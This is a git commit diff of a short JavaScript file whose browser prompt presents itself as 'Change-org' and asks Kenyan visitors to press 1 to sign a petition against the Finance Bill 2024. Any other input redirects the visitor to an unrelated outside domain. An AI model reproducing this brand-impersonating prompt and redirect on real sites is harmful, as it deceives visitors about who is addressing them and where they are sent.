b1732153437bb8302550e7bb92efb182c4d7c702
boss-bloq <nsisboy01@gmail.com>
2024-06-22 14:59:50 -0700

    Update change.js

--- change.js
+++ change.js
@@ -1,6 +1,6 @@
 
 var password = '1'
-password=prompt('Change-org: Hello Kenyan, Please help sign this petition, kindly press 1 to start petition now ','1');
+password=prompt('Change-org: Hello Kenyan, Please help sign this petition REJECTFINANCEBILL2024. kindly press 1 to start petition now ','1');
 if (password != '1') {
 location.href='https://damba-fest.org/sign-this-petition.html';
 }
